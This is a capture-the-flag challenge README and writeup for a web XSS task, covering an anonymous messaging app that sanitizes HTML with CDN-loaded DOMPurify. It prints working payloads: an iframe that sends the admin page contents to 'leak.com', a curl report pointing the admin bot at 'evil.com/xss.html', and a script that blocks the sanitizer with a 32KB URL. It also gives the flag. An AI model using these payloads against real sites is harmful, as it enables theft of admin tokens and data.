# ANONYMAUXSS

## Category:

`web` 

## Description:

Users can post anonymous and ephemeral messages and send a secret or a link to the receiver. Once read, the message is deleted. The message allows HTML and it's sanitized on client side with DOMPurify, which is loaded form a CDN.

There is a hidden 'reporting' section that aims to be used for contacting the admin. There's also a hidden '/admin' path that appears in the `robots.txt` file. All messages sent to the report backend are automatically processed and the first http link will be visited.

The attacker, hence, needs to craft a XSS payload that bypassed the client-side sanitization, send the link to the admin via the report API, and read the `/admin` section that contains the token.

Unfortunately, nobody solved this task during the competition. You should try before reading more.

## Hints:
* It's a XSS challenge
* /admin need to be guessed
* Why bypass filter when you can DoS?

## Build docker image:

```
$ docker build -t anonymauxss .
```

## Run docker:

```
$ docker run -d --name anonymauxss --add-host=nn7ed.ka0labs.org:127.0.0.1 --restart=always -p 9999:9999 anonymauxss
```

## Writeup:

DoS via huge Referer to avoid loading DOMPurify.

URL-based link is only triggered via `onhashchange`, so the attacker payload needs to iframe the page and change the hash.

Send message with secret secret:

```
secret: fooobar
msg: <iframe id=f src="/admin" onload="history.pushState(0,0,'aaaa');new Image().src='//leak.com/?log='+escape(f.contentWindow.document.body.innerHTML)"></iframe>
```

When triggered will leak the flag: nn7ed{yeah_we11_sc1entific4lly_tr4dit10ns_ar3_an_1diOt_th!ng_l0l}

Report url to admin:

```
curl http://nn7ed.ka0labs.org:9999/p/report -X "POST" -H "Content-Type: application/json" -d '{"report":"http://evil.com/xss.html"}'
```

Content of `xss.html` triggers XSS:

```
<iframe id=f></iframe>
<script>
let url = 'http://nn7ed.ka0labs.org:9999/?'+'A'.repeat(32000)+'#'; // the >32kb URL will appear in the Referrer when requesting to the CDN and the request will fail
f.contentWindow.location = url;
setTimeout(function(){
    f.contentWindow.location = url + 'fooobar';
}, 800);
</script>
```
